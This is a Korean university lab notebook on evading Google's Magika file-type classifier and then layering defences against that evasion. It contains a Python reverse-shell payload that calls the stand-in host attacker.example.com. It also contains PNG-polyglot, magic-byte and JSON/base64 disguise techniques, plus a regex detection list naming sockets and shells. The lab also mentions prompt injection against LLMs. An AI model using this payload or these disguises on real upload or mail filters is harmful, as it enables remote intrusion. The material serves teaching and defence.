# 🔐 IT306 보안 프로그래밍 — 실습 8: AI 분류기 회피 공격

| | |
|---|---|
| **타깃 모델** | Magika (Google, AI 기반 파일 타입 분류기) |
| **실습 1** | Evasion Attack — 악성 Python 스크립트를 PNG/텍스트로 위장 |
| **실습 2** | Defense in Depth — 앙상블 탐지 + 구조적 검증 |

> 지난주: **LLM을 공격**했습니다 (Prompt Injection).
> 이번주: **AI 보안 도구를 공격**합니다 (Evasion Attack).
> 둘 다 **추론 단계(inference-time)** 공격이라는 공통점이 있습니다.

> ⚠️ 이 실습의 공격 기법은 **교육 목적**으로만 사용하세요.

---
## ⚙️ 환경 준비

```bash
# 터미널에서 미리 실행해두세요
pip install magika
# Linux/macOS 에서 file 명령이 필요합니다 (대부분 기본 설치)
file --version
```

In [ ]:
# 패키지 설치 (최초 1회)
# !pip install magika

import os
import re
import math
import json
import struct
import zlib
import base64
import subprocess
from collections import Counter
from magika import Magika

# Magika 인스턴스 — 내부적으로 Keras/ONNX 모델을 로드한다 (약 1MB)
m = Magika()

# 작업 디렉토리
WORKDIR = '/tmp/it306_lab8'
os.makedirs(WORKDIR, exist_ok=True)

# ── 공통 헬퍼 ────────────────────────────────────────────────────────
def classify(label: str, data: bytes, target_evasion: str = 'python'):
    """파일 내용을 Magika 로 분류하고 결과를 예쁘게 출력.

    target_evasion : 원래 분류되어야 했던 타입. 이 타입이 아니면 공격 성공.
    """
    res = m.identify_bytes(data)
    evaded = (res.output.label != target_evasion)
    icon = '🔴 회피 성공' if evaded else '🟢 탐지됨'
    print(f'{icon}  [{label}]')
    print(f'  size        : {len(data):,} bytes')
    print(f'  dl.label    : {res.dl.label:15s} (score={res.score:.3f})')
    print(f'  final label : {res.output.label}')
    print('─' * 68)
    return res

def save(name: str, data: bytes) -> str:
    path = os.path.join(WORKDIR, name)
    with open(path, 'wb') as f:
        f.write(data)
    return path

# 연결 확인
try:
    probe_code = b'import os\nfor i in range(10):\n    print(i)\n'
    probe = m.identify_bytes(probe_code)
    print(f'✅ Magika 로드 성공 | 모델: {m.get_model_name()}')
    print(f'   테스트 분류 → {probe.output.label} (score={probe.score:.3f})')
except Exception as e:
    print(f'❌ 로드 실패: {e}')

---
# 🧪 실습 1: Evasion Attack — Magika를 속여라

## 시나리오
메일 게이트웨이, 업로드 서버, AV 프리필터가 Magika로 파일 타입을 판별한 뒤
"이미지는 통과, Python은 차단" 규칙을 적용한다고 가정합니다.

공격자의 목표는 **악성 Python 페이로드를 이미지나 텍스트로 위장**하여 필터를 뚫는 것입니다.

```
┌─────────────────────────────────────────────────────────────┐
│  공격자가 제어 가능: 파일 바이트 전체                          │
│  공격자가 제어 불가: Magika 모델, 서버 코드                    │
│                                                              │
│  [악성 Python 원본]                                          │
│        ↓  바이트 조작                                         │
│  [Magika 판정: png/txt/json]  ← 공격 성공                    │
│        ↓                                                     │
│  [실제 실행 시 payload 작동]  ← 공격자 코드 실행              │
└─────────────────────────────────────────────────────────────┘
```

## 공격 기법 3가지
| 레벨 | 기법 | 핵심 아이디어 |
|---|---|---|
| 1 | Magic Byte Injection | 가짜 포맷 시그니처를 앞에 붙인다 |
| 2 | Polyglot (유효 PNG) | 실제로 유효한 이미지 뒤에 payload를 붙인다 |
| 3 | Content Camouflage | 대량의 텍스트로 도배하여 통계를 흐린다 |

In [ ]:
# ── 공격용 페이로드 ──────────────────────────────────────────────────
# (리버스 쉘 시그니처를 가진 간단한 페이로드 — 교육용, 실행하지 않는다)
PAYLOAD_PY = b"""import os
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.example.com", 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1)
os.system("/bin/sh")
"""

print(f'페이로드 크기: {len(PAYLOAD_PY)} bytes')
print('─' * 68)

# 베이스라인: 가공 없이 Magika 에 통과
print('[베이스라인] 위장 없는 원본 Python')
classify('Baseline (plain Python)', PAYLOAD_PY, target_evasion='python')

### 1-1. 공격 1: Magic Byte Injection

파일 앞에 PNG 시그니처 `89 50 4E 47 0D 0A 1A 0A` 만 덧붙이는 가장 단순한 공격.
구조가 유효한 PNG는 아니지만, Magika의 신뢰도를 크게 떨어뜨린다.

In [ ]:
# PNG 시그니처만 덧붙인 "최소 공격"
PNG_SIG = b'\x89PNG\r\n\x1a\n'
attack1 = PNG_SIG + b'\x00' * 16 + b'\n' + PAYLOAD_PY

print('[공격 1] Magic byte 만 덧붙이기')
classify('Attack 1: magic byte injection', attack1, target_evasion='python')

# 결과 해석:
# - dl.label 은 여전히 python 에 가까울 수 있음
# - 하지만 신뢰도가 낮아져서 output 은 txt/unknown 으로 떨어진다
# - "python 으로는 더 이상 분류되지 않는다" = 차단 필터 우회 성공

### 1-2. 공격 2: Polyglot (유효한 PNG + 페이로드)

**핵심 아이디어:** 진짜 유효한 PNG 파일을 만들고, 그 뒤에 페이로드를 붙인다.
- PNG 포맷은 `IEND` 청크로 공식적으로 끝나지만, 대부분의 파서는 그 뒤를 무시한다.
- 이미지 뷰어로 열면 정상 PNG가 보이고, Python 인터프리터는 구문 에러로 실패하지만
  일부 환경에서는 앞부분을 주석 처리하면 실행 가능.

Magika는 `start/middle/end` 3개 구간을 샘플링하는데, PNG 본문이 충분히 크면
샘플의 대부분이 PNG 특성을 띠게 되어 **PNG로 강하게 오분류**된다.

In [ ]:
# ── 진짜 유효한 PNG 생성기 ────────────────────────────────────────────
def make_valid_png(width=50, height=50) -> bytes:
    """단색 RGB PNG를 생성한다. libpng/Pillow/OS 뷰어에서 정상 렌더링."""
    sig  = b'\x89PNG\r\n\x1a\n'

    # IHDR — image header (width, height, bit_depth=8, color_type=2=RGB)
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    ihdr = (struct.pack('>I', 13) + b'IHDR' + ihdr_data
            + struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data)))

    # IDAT — image data (각 행은 filter byte + 픽셀)
    raw = b''
    for _ in range(height):
        raw += b'\x00' + b'\xFF\x00\x00' * width   # 빨간색 한 줄
    compressed = zlib.compress(raw)
    idat = (struct.pack('>I', len(compressed)) + b'IDAT' + compressed
            + struct.pack('>I', zlib.crc32(b'IDAT' + compressed)))

    # IEND — end marker
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', zlib.crc32(b'IEND'))

    return sig + ihdr + idat + iend

# ── 공격 2 구성 ──────────────────────────────────────────────────────
real_png = make_valid_png(50, 50)
print(f'유효한 PNG 생성: {len(real_png)} bytes')

attack2 = real_png + b'\n' + PAYLOAD_PY
print()
print('[공격 2] 유효 PNG + payload 를 IEND 뒤에 붙이기')
classify('Attack 2: valid PNG polyglot', attack2, target_evasion='python')

# 디스크에도 저장 — 이 파일을 이미지 뷰어로 열면 정상 이미지가 뜬다!
path2 = save('evil.png', attack2)
print(f'저장: {path2}  (이미지 뷰어로 열어보면 빨간 사각형이 보입니다)')

### 1-3. 공격 3: Content Camouflage

분류기가 통계적 패턴을 학습한다는 점을 역이용.
**대량의 정상 텍스트**로 파일을 도배하고 페이로드를 끝에 숨긴다.

In [ ]:
# 공격 3-a: 긴 산문 (blog post 스타일)
prose = b"""The history of computer security spans many decades.
From the earliest days of time-sharing systems in the 1960s,
researchers have grappled with the fundamental challenge of
protecting data and computation from unauthorized access.
Early work in the 1970s established foundational concepts
like the reference monitor and the principle of least privilege.
These ideas continue to inform security architecture today.
""" * 8

attack3a = prose + b'\n\n' + PAYLOAD_PY
print('[공격 3-a] 산문 위장')
classify('Attack 3a: prose camouflage', attack3a, target_evasion='python')

# 공격 3-b: JSON 구조 안에 base64 페이로드 숨기기
json_wrap  = b'{\n  "dataset": "cifar10",\n  "version": "1.0",\n  "records": [\n'
for i in range(20):
    json_wrap += f'    {{"id": {i}, "label": "cat", "path": "img_{i}.png"}},\n'.encode()
json_wrap += b'  ],\n  "notes": "' + base64.b64encode(PAYLOAD_PY) + b'"\n}\n'

print()
print('[공격 3-b] JSON + base64 은닉')
classify('Attack 3b: JSON wrapper', json_wrap, target_evasion='python')

### ✏️ 관찰 1
세 공격의 결과를 비교해보세요.

- 공격 1 (magic byte만):
- 공격 2 (유효 PNG):
- 공격 3 (위장):
- Magika의 `dl.label`(raw 모델 예측) 과 `output.label`(최종 출력)의 차이는 왜 생기는가?

**내 관찰:**

- 가장 확신도 높게 오분류된 공격:
- 이유 (Magika의 샘플링 방식과 관련하여):
- `dl.label` vs `output.label` 차이의 의미:

### 1-4. 🎯 Red Team 실습: 당신의 회피 공격을 설계하라

아래 `MY_EVASIONS` 리스트에 **2가지 새로운 회피 기법**을 추가하세요.

**힌트:**
- **타깃 타입을 바꿔보기** — PNG 말고 GIF, ZIP, PDF로 위장 (각 포맷의 magic byte 찾아보기)
- **Shebang 활용** — `#!/usr/bin/env python` 뒤에 이미지 바이트가 오면?
- **다른 언어로 위장** — Python 코드를 JavaScript/Shell 주석에 숨기면?
- **크기 조작** — 아주 작거나 (수십 바이트) 아주 큰 (수 MB) 파일

In [ ]:
# 🔴 Red Team: 나만의 회피 공격을 설계하세요
def my_evasion_1() -> bytes:
    # TODO: 여기에 당신의 공격을 작성
    # 반환값은 bytes. 원래 PAYLOAD_PY 를 어딘가 포함해야 한다.
    return PAYLOAD_PY  # 기본값 — 꼭 바꾸세요

def my_evasion_2() -> bytes:
    # TODO
    return PAYLOAD_PY

# 실행
MY_EVASIONS = [
    ('내 공격 1', my_evasion_1()),
    ('내 공격 2', my_evasion_2()),
]

print('=' * 68)
print('  Red Team 결과')
print('=' * 68)
for label, data in MY_EVASIONS:
    classify(label, data, target_evasion='python')

---
# 🛡️ 실습 2: Defense in Depth — 회피를 막아라

## 핵심 인사이트
공격 2 (유효 PNG + payload) 는 **Magika뿐 아니라 `file` 명령까지 속인다.**
AI 기반이든 시그니처 기반이든 **단일 분류기는 충분하지 않다.**

## 방어 전략: 여러 층을 쌓는다
```
입력 파일
    ↓
[Layer 1] Magika (AI)   + file 명령 (시그니처)   → 앙상블
    ↓
[Layer 2] 엔트로피 / 구조적 검증 (strict parser)
    ↓
[Layer 3] 위험 패턴 스캔 (YARA 스타일)
    ↓
통과 → 업로드 허용 / 실패 → 격리
```

각 층이 서로 다른 원리로 작동해서, 한 층을 속인 공격이 다음 층에서 잡히도록 한다.

### 2-1. 단일 방어의 한계 확인

Magika 하나만 쓰면, `file` 하나만 쓰면 — 얼마나 잘 막을까?

In [ ]:
# 공격 2 파일을 다양한 단일 탐지기로 검사
path_evil  = save('evil.png',  real_png + b'\n' + PAYLOAD_PY)
path_clean = save('clean.png', real_png)

def solo_detect(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()

    # (1) Magika
    magika_label = m.identify_bytes(data).output.label

    # (2) file 명령 (libmagic, 1970년대부터 사용)
    r = subprocess.run(['file', '-b', filepath], capture_output=True, text=True)
    file_label = r.stdout.strip()[:60]

    # (3) 확장자 신뢰
    ext = os.path.splitext(filepath)[1]

    return magika_label, file_label, ext

print('=' * 68)
print('  단일 탐지기 결과 비교')
print('=' * 68)
for label, path in [('악성 (유효 PNG + payload)', path_evil),
                    ('정상 PNG',                 path_clean)]:
    mg, fc, ex = solo_detect(path)
    print(f'\n[{label}]')
    print(f'  파일 확장자  : {ex}')
    print(f'  Magika      : {mg}')
    print(f'  file 명령   : {fc}')
    print(f'  → 단일 탐지기로는 두 파일을 구별할 수 없다!')

### 2-2. 앙상블 + 구조적 검증 + 패턴 스캔

In [ ]:
# ── Layer A: Shannon 엔트로피 계산 ────────────────────────────────
def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = Counter(data)
    n = len(data)
    return -sum((c/n) * math.log2(c/n) for c in counts.values())

# 압축된 PNG 이미지 데이터는 엔트로피 ~7.8-8.0
# 평범한 텍스트는 ~4.0-5.0
# 혼합(PNG+text)은 그 중간 → 의심 신호

# ── Layer B: 엄격한 PNG 파서 ──────────────────────────────────────
def strict_png_validate(data: bytes) -> tuple[bool, str]:
    """진짜 PNG 는 IEND 청크로 깔끔하게 끝나야 한다.
       IEND 뒤에 바이트가 남아있으면 polyglot/stego 의심."""
    if not data.startswith(b'\x89PNG\r\n\x1a\n'):
        return False, 'PNG signature missing'
    iend_marker = b'IEND\xaeB`\x82'     # IEND + IEND의 CRC
    idx = data.find(iend_marker)
    if idx == -1:
        return False, 'IEND chunk not found'
    trailing = data[idx + len(iend_marker):]
    if trailing.strip():
        return False, f'{len(trailing)}B of trailing data after IEND (polyglot!)'
    return True, 'clean PNG'

# ── Layer C: 위험 패턴 스캔 (YARA 스타일) ──────────────────────────
DANGER_PATTERNS = [
    (rb'import\s+(os|subprocess|socket|pty|ctypes)', 'python-sensitive-import'),
    (rb'\bexec\s*\(',                              'python-exec'),
    (rb'\beval\s*\(',                              'python-eval'),
    (rb'/bin/(sh|bash)',                              'shell-reference'),
    (rb'socket\.socket',                             'network-socket'),
    (rb'base64\.b64decode',                          'base64-decode'),
    (rb'__import__',                                  'dynamic-import'),
]

def scan_patterns(data: bytes) -> list[str]:
    return [name for pat, name in DANGER_PATTERNS if re.search(pat, data)]

# ── 앙상블 검증기 ──────────────────────────────────────────────────
def ensemble_verify(filepath: str) -> dict:
    with open(filepath, 'rb') as f:
        data = f.read()

    # 1) 분류기 2개
    magika_label = m.identify_bytes(data).output.label
    r = subprocess.run(['file', '-b', '--mime-type', filepath],
                       capture_output=True, text=True)
    file_mime = r.stdout.strip()

    # 2) 엔트로피
    entropy = shannon_entropy(data)

    # 3) 구조 검증 (PNG 인 경우에만)
    structural_ok, structural_msg = True, 'n/a'
    if magika_label == 'png' or file_mime == 'image/png':
        structural_ok, structural_msg = strict_png_validate(data)

    # 4) 패턴 스캔
    pattern_hits = scan_patterns(data)

    # 최종 판단 — 한 층이라도 의심스러우면 차단
    reasons = []
    if not structural_ok:
        reasons.append(f'structural: {structural_msg}')
    if pattern_hits:
        reasons.append(f'patterns: {pattern_hits}')
    if magika_label == 'png' and entropy < 6.5:
        reasons.append(f'entropy too low for PNG: {entropy:.2f}')

    return {
        'blocked'   : len(reasons) > 0,
        'reasons'   : reasons,
        'magika'    : magika_label,
        'file_mime' : file_mime,
        'entropy'   : round(entropy, 2),
        'structural': structural_msg,
        'patterns'  : pattern_hits,
    }

# ── 테스트 ─────────────────────────────────────────────────────────
print('=' * 68)
print('  앙상블 방어 테스트')
print('=' * 68)

for label, path in [('악성 (유효 PNG + payload)', path_evil),
                    ('정상 PNG',                 path_clean)]:
    v = ensemble_verify(path)
    icon = '🚫 차단' if v['blocked'] else '✅ 통과'
    print(f'\n{icon}  [{label}]')
    for k in ('magika', 'file_mime', 'entropy', 'structural', 'patterns'):
        print(f'  {k:10s}: {v[k]}')
    if v['reasons']:
        print(f'  ────────────')
        for r in v['reasons']:
            print(f'  ⚠ {r}')
    print('─' * 68)

### ✏️ 관찰 2
- Magika 와 `file` 명령이 **둘 다 속았는데** 왜 앙상블이 작동했을까?
- 구조적 검증(strict parser)이 잡은 건 무엇인가? AI로는 왜 어려운가?
- 어떤 공격 유형에서는 앙상블도 뚫릴 수 있을까?

**내 관찰:**

- 앙상블이 작동한 이유:
- 구조적 검증의 장단점:
- 앙상블도 막기 어려운 공격:

### 2-3. 🎯 Blue Team 실습: 방어 레이어 강화

현재 `ensemble_verify()` 는 PNG 공격은 잘 막지만, 다른 포맷(JSON, TXT)으로 위장한
공격 3 계열은 **구조 검증 대상이 아니어서** 통과될 수 있습니다.

아래 `my_validator()` 를 수정하여, Red Team 공격(2-1에서 만든 것 + 공격 3a, 3b) 까지
포함해 최대한 많은 공격을 막아보세요.

In [ ]:
# 🔵 Blue Team: 검증 로직을 강화하세요
def my_validator(filepath: str) -> dict:
    """
    반환값: {'ok': True} 또는 {'ok': False, 'reason': '...'}

    힌트:
    - 파일 크기 / 엔트로피 조합 — 작은 JSON 에 고엔트로피 영역이 있으면 base64 은닉 의심
    - Magika 의 score 가 낮으면 (예: < 0.7) 신뢰하지 말고 보수적으로 차단
    - 텍스트로 분류된 파일에도 패턴 스캔 적용
    - 파일 내 '이종 영역' 탐지 — 앞부분과 뒷부분의 엔트로피가 크게 다르면 polyglot
    """
    with open(filepath, 'rb') as f:
        data = f.read()

    # TODO: 여기에 추가 검증 로직을 작성하세요

    return {'ok': True}

# ── 통합 v2 ───────────────────────────────────────────────────────
def ensemble_v2(filepath: str) -> dict:
    v1 = ensemble_verify(filepath)
    if v1['blocked']:
        return v1
    v2 = my_validator(filepath)
    if not v2['ok']:
        return {'blocked': True, 'reasons': [f"my_validator: {v2['reason']}"], **v1}
    return v1

# ── 전체 테스트 ───────────────────────────────────────────────────
# 2-1 에서 만든 파일들 + 공격 3 계열 + 정상 파일
attack_files = {
    '공격 1 (magic byte)' : attack1,
    '공격 2 (유효 PNG)'    : attack2,
    '공격 3-a (산문)'      : attack3a,
    '공격 3-b (JSON)'      : json_wrap,
    'Red Team 1'          : my_evasion_1(),
    'Red Team 2'          : my_evasion_2(),
    '정상: plain text'     : b'Hello world, this is a normal note.\n' * 5,
    '정상: PNG'           : real_png,
    '정상: JSON'          : b'{"name": "alice", "age": 30, "city": "Seoul"}\n',
}

print('=' * 68)
print('  Blue Team 결과')
print('=' * 68)
blocked = passed = 0
for name, data in attack_files.items():
    p = save(name.replace(' ', '_').replace('(', '').replace(')', '')
             .replace(':', '') + '.bin', data)
    v = ensemble_v2(p)
    is_attack = name.startswith('공격') or name.startswith('Red')
    if v['blocked']:
        blocked += (1 if is_attack else 0)
        icon = '🚫 차단'
    else:
        passed += (1 if not is_attack else 0)
        icon = '✅ 통과'
    print(f'{icon}  {name:25s}  {v.get("reasons", "") if v["blocked"] else ""}')

total_attacks = sum(1 for n in attack_files if n.startswith('공격') or n.startswith('Red'))
total_legit   = len(attack_files) - total_attacks
print()
print(f'공격 차단: {blocked}/{total_attacks}   정상 통과: {passed}/{total_legit}')

### ✏️ 관찰 3
- 모든 공격을 차단했는가? 뚫린 공격은 왜 뚫렸을까?
- 정상 파일 중 오탐(false positive) 된 것은? 방어 레이어의 trade-off는?
- 실무 시스템이라면 추가로 어떤 레이어를 넣어야 할까? (힌트: 샌드박스, 행위 분석, 격리 네트워크...)

**내 관찰:**

- 뚫린 공격과 그 이유:
- 오탐 케이스:
- 추가로 필요한 방어 레이어:

---
## 📌 실습 요약

| | 지난 주 (Prompt Injection) | 이번 주 (Evasion Attack) |
|---|---|---|
| **공격 대상** | LLM (EXAONE) | 분류기 (Magika) |
| **공격 단계** | 추론 (inference) | 추론 (inference) |
| **타깃이 속는 이유** | system/user 프롬프트를 구조적으로 분리 못함 | 학습 분포 밖 입력에 취약 |
| **1차 방어** | 시스템 프롬프트 강화 | 분류기 하나 더 추가 (앙상블) |
| **2차 방어** | 출력 스키마(JSON) 강제 | 구조적 검증 (strict parser) |
| **3차 방어** | 코드 레벨 검증 레이어 | 위험 패턴 스캔 |
| **공통 교훈** | 단일 AI 레이어로는 불충분 | 단일 AI 레이어로는 불충분 |

### 핵심 교훈

> **"AI 기반 보안 도구도 AI이다 — 공격의 대상이 될 수 있다.**
> **AI를 single source of truth로 쓰지 말고, 서로 다른 원리의 방어층을 쌓아라."**

### AI 시스템 공격 표면 (지금까지 배운 내용 지도)
```
                  AI 시스템 공격 표면
    ┌──────────────┬──────────────────┬──────────────┐
    │  학습 단계    │  추론 단계        │  모델 자체    │
    ├──────────────┼──────────────────┼──────────────┤
    │ Data Poison  │ Prompt Injection │ Supply Chain │
    │ Backdoor     │  (지난주 ✓)       │ (다음주?)    │
    │              │ Evasion Attack   │              │
    │              │  (이번주 ✓)       │              │
    │              │ Model Extraction │              │
    └──────────────┴──────────────────┴──────────────┘
```

### 실무 체크리스트
- [ ] AI 분류기를 **유일한 탐지 수단**으로 쓰지 않기
- [ ] 시그니처/AI/구조적 파서 **3종 앙상블** 구성
- [ ] 낮은 신뢰도 예측은 자동 격리 (human review)
- [ ] **Polyglot 탐지** 로직 필수 (IEND 뒤 trailing data 등)
- [ ] **Adversarial Training** — 알려진 회피 샘플을 학습 데이터에 포함
- [ ] 탐지 결과 **로깅** — 공격 패턴의 시간적 변화 추적
- [ ] 최종 방어선: **샌드박스 실행 관찰** (행위 기반 탐지)